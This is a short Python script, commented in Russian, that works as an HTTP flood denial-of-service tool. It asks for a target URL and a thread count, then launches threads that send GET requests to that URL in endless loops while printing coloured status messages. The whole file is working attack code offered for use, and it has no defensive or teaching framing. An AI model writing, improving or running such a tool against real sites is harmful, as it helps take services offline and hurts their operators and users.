import colorama
import threading
import requests

def dos(target): # Основная функция
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.LIGHTBLUE_EX + "[+]" + colorama.Fore.LIGHTGREEN_EX + "Request sent!" + colorama.Fore.YELLOW) # вывод на экран того что запрос на сервер отправлен
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[-]" + colorama.Fore.LIGHTCYAN_EX + "Connection error") # вывод на экран того что запрос на сервер не отправлен


threads = 20 # Количество запросов по дефолту

url = input("URL:") # Присвоение акатуемого URL

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!") # если в потоках указано не число либо оно не верно

if threads == 0:
    exit("Threads count is incorrect!") # Проверка, если количество потоков равно нулю завершить программу

if not url.__contains__("http"):
    exit("URL doesent contains http or https!") # Проверка на наличие в URL https:// или http://

if not url.__contains__("."):
    exit("Invalid domain") # Проверка на наличие в URl домена(.com, .org и т.д.)

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " Thread started")
